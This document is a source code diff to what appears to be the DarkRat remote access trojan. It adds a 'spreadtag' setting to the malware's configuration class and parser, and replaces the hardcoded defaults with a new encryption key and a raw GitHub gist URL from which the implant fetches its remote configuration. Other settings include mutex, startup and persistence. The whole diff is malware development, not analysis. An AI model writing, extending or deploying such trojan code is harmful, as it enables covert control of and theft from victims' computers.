@@ -32,6 +32,7 @@ namespace darkRat
 			std::string startup;
 			std::string requestInterval;
 			std::string persistence;
+			std::string spreadtag;
 
 			std::string type = "Full";
 			std::string versionID = "2.1.1";
@@ -39,12 +40,13 @@ namespace darkRat
 			std::string encryptionKey;
 
 
-			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::list<std::string> pn)
+			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::list<std::string> pn)
 			{
 				encryptionKey = ek;
 				pastebinUrl = pu;
 				persistence = per;
 				mutex = mux;
+				spreadtag = st;
 				startup = sup;
 				requestInterval = ri;
 			}
@@ -73,13 +75,14 @@ namespace darkRat
 				std::string sup = j_config["sup"];
 				std::string ri = j_config["ri"];
 				std::string pre = j_config["pre"];
+				std::string spreadtag = j_config["st"];
 				std::list<std::string> pn = j_config["pn"];
 
-				return config(ek, pu, mux, sup, ri, pre, pn);
+				return config(ek, pu, mux, sup, ri, pre, spreadtag, pn);
 			}
 			
 
-			return config("KQC", "http://pastebin.com/raw/mTLXBksj", "mutextest", "false", "10", "false", {});
+			return config("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>", "http://gist.githubusercontent.com/darkspiderbots/966601ef8a8cf5257a515b3ee705c93f/raw/2199f0703f3625ac61e12aa0c7115db0342bb4a7/test", "mutextest", "false", "390", "false", "spreadtag",{});
 	
 		}
 	}
